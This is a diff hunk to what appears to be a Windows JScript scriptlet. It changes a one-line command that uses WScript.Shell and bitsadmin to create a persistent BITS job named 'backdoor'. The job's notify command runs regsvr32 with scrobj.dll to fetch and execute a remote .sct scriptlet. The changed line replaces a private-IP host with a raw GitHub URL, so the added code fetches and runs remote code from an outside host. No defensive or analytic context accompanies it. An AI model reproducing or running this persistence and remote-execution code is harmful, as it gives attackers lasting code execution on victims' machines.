@@ -8,7 +8,7 @@ classid="{AAAA0111-0000-0000-0000-0000FEEDACDC}"
  >
  <script language="JScript">
       <![CDATA[
-      	   var r = new ActiveXObject("WScript.Shell").Run("cmd /c bitsadmin /create backdoor & bitsadmin /addfile backdoor %comspec%  %temp%\\cmd.exe & bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe \"/n /u /s /i:http://192.168.110.133/2.sct scrobj.dll\" & bitsadmin /SetMinRetryDelay backdoor 100 & bitsadmin /Resume backdoor",0);
+      	   var r = new ActiveXObject("WScript.Shell").Run("cmd /c bitsadmin /create backdoor & bitsadmin /addfile backdoor %comspec%  %temp%\\cmd.exe & bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe \"/n /u /s /i:https://raw.githubusercontent.com/lucycool/1/master/2.sct scrobj.dll\" & bitsadmin /SetMinRetryDelay backdoor 100 & bitsadmin /Resume backdoor",0);
 	   
       ]]>
  </script>
